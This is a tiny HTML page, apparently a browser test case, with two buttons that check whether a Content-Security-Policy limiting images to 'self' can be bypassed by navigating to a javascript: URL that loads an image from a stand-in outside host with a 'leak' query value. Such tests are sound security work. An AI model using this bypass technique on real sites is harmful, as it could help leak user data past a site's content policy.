<html>
<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline' 'self'; img-src 'self'"/>
<body>
<button onclick="breakit1()">CSP TEST1</button>
<button onclick="breakit2()">CSP TEST2</button>
<script>
    function breakit1(){
        open("javascript:'<img src=https://a.test/report/?leak=c971231>'","_self");
    }

    function breakit2(){
        location.href="javascript:'<img src=https://a.test/report/?leak=c971231>'";
    }
</script>
</body>
</html>